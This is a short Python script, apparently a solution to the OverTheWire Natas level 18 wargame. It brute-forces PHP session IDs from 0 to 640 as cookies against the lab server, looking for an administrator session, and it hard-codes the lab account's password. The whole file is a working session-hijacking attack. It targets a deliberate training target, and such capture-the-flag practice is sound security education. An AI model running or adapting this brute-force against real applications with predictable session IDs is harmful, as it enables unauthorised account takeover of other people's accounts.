#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import requests

url = "http://natas18.natas.labs.overthewire.org?debug&username=admin"
for sessid in range(0,641):
    print "SESSID:", sessid
    cookies = dict(PHPSESSID = str(sessid))
    r = requests.post(url, cookies=cookies, auth=("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"))
    if "logged in as a regular user" in r.text:
        pass
    else:
        print r, r.text
